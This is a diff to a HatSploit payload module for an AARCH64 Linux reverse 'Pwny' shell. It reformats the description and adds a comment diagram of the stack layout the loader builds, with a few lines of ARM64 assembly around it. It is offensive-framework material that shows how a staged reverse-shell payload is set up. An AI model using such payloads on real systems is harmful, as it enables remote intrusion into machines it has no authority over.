@@ -22,10 +22,10 @@ class HatSploitPayload(Payload, Handler):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive reverse Pwny shell for Linux "
-                "with AARCH64 architecture."
-            ),
+            'Description': """
+                This payload creates an interactive reverse Pwny shell for Linux
+                with AARCH64 architecture.
+            """,
             'Arch': ARCH_AARCH64,
             'Platform': OS_LINUX,
             'Session': PwnySession,
@@ -77,6 +77,32 @@ class HatSploitPayload(Payload, Handler):
                 ldr x0, [x0]
                 add x0, x0, x10
                 mov x14, x0
+
+            #################################################
+            ##
+            ##    +----------------------------------+ low
+            ##    |              ARGC                |
+            ##    |----------------------------------|
+            ##    |           ARGV[0] = p            |
+            ##    |----------------------------------|
+            ##    |         ARGV[1] = sock           |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ARGV)         |
+            ##    |----------------------------------|
+            ##    |          ENV strings             |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ENV)          |
+            ##    |----------------------------------|
+            ##    |           AT_BASE (7)            |
+            ##    |----------------------------------|
+            ##    |   address of pwny binary image   |
+            ##    |----------------------------------|
+            ##    |           AT_NULL (0)            |
+            ##    |----------------------------------|
+            ##    |         NULL (ends AUXV)         |
+            ##    +----------------------------------+ high
+            ##
+            #################################################
 
                 mov x0, sp
                 and sp, x0, -16
